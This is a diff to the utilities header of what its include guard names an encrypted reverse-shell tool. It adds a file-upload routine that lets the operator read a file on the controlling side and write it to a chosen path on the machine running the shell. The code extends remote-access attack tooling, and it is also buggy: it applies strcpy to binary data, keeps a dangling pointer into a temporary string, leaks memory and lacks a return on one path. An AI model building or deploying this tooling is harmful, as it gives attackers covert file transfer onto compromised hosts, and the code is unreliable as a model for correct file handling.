@@ -6,6 +6,8 @@
 #include <complex>
 #include <cstring>
 #include <iostream>
+#include <fstream>
+
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <fcntl.h>
@@ -13,6 +15,8 @@
 #include <pty.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+
+
 
 inline char* toLower(char* arg) {
 
@@ -71,6 +75,51 @@ inline void safeShutdown(const std::string& msgToSnd, const int socket, const in
     SSL_free(ssl);
     SSL_CTX_free(ctx);
     exit(EXIT_FAILURE);
+}
+// example server fileToUpload (ttyBuffer), pathToUploadTo
+inline char* uploadFile(const std::string& clientOrServer, const char* fileToUpload, const std::string& pathToUploadTo) {
+
+    if (clientOrServer == "server") {
+        std::ifstream inputFile(fileToUpload, std::ios::binary | std::ios::ate);
+
+        if (!inputFile) {
+            std::cout << "[!] Error opening file " << fileToUpload << std::endl;
+            return nullptr;
+        }
+
+        std::streamsize fileSize = inputFile.tellg();
+        inputFile.seekg(0, std::ios::beg);
+
+        char* fileBuffer = new char[fileSize];
+
+        if (!inputFile.read(fileBuffer, fileSize)) {
+            std::cout << "[!] Error reading file " << fileToUpload << std::endl;
+            return nullptr;
+        }
+
+        inputFile.close();
+
+        char* returnChar = new char[fileSize];
+
+        strcpy(returnChar, fileBuffer);
+
+        return returnChar;
+    }
+    else if (clientOrServer == "client") {
+
+        // need to parse incoming buffer at fileToUpload
+        // theoretically it will contain the string "upload\n" everything after will be the file.
+        ssize_t uploadStrSize = sizeof("upload\n") - 1;
+
+        std::string tmpStr (fileToUpload);
+        tmpStr = tmpStr.substr(uploadStrSize);
+
+        fileToUpload = tmpStr.c_str();
+
+        std::ofstream outputFile((pathToUploadTo), std::ios::binary | std::ios::ate);
+
+        outputFile.write(fileToUpload, strlen(fileToUpload));
+    }
 }
 
 #endif //ENCRYPTED_REV_SHELL_UTILS_H
